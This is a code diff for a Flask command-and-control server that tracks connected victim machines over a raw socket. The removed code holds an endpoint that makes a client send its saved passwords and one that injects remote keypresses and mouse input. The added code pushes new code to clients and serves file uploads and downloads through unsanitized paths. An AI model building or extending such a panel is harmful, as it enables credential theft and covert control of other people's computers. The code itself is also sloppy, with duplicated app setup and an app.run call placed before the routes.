@@ -1,12 +1,9 @@
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, send_file
 import threading
 import socket
-import json
-import time
 import os
-import subprocess
-
-app = Flask(__name__)
+import time
+import shutil
 
 app = Flask(__name__)
 
@@ -18,13 +15,15 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
 
 
-# Store connected clients
+
 clients = {}
 client_lock = threading.Lock()
+UPLOAD_FOLDER = 'uploads'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 def start_server_socket():
     HOST = '0.0.0.0'
-    PORT = 5784
+    PORT = 5555
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
         s.listen()
@@ -36,40 +35,34 @@ def start_server_socket():
                 clients[client_id] = {"conn": conn, "addr": addr}
             print(f"[+] {client_id} connected from {addr}")
 
-# Password retrieval endpoint
-@app.route('/api/get_passwords', methods=['POST'])
-def get_passwords():
-    client_id = request.json.get("client_id")
-    if client_id not in clients:
-        return jsonify({"error": "Client not found"}), 404
-    
-    try:
-        clients[client_id]["conn"].sendall(b"GET_PASSWORDS")
-        passwords = clients[client_id]["conn"].recv(8192).decode()
-        return jsonify({"passwords": passwords})
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+# File Upload
+@app.route('/api/upload', methods=['POST'])
+def upload_file():
+    if 'file' not in request.files:
+        return jsonify({"error": "No file uploaded"}), 400
+    file = request.files['file']
+    file.save(os.path.join(UPLOAD_FOLDER, file.filename))
+    return jsonify({"status": "File uploaded"})
 
-# Remote control endpoint
-@app.route('/api/send_input', methods=['POST'])
-def send_input():
+# File Download
+@app.route('/api/download', methods=['GET'])
+def download_file():
+    filename = request.args.get('filename')
+    return send_file(os.path.join(UPLOAD_FOLDER, filename), as_attachment=True)
+
+# Remote Code Update
+@app.route('/api/update_client', methods=['POST'])
+def update_client():
     client_id = request.json.get("client_id")
-    key = request.json.get("key")
-    action = request.json.get("action")  # 'keypress', 'mouse_move', 'mouse_click'
-    
+    new_code = request.json.get("code")
     if client_id not in clients:
         return jsonify({"error": "Client not found"}), 404
-    
     try:
-        clients[client_id]["conn"].sendall(f"{action}:{key}".encode())
-        return jsonify({"status": "Input sent"})
+        clients[client_id]["conn"].sendall(f"UPDATE_CODE:{new_code}".encode())
+        return jsonify({"status": "Update sent"})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
     threading.Thread(target=start_server_socket, daemon=True).start()
     app.run(host='0.0.0.0', port=5000)
-    
-app = Flask(__name__)
- 
-app = Flask(__name__)
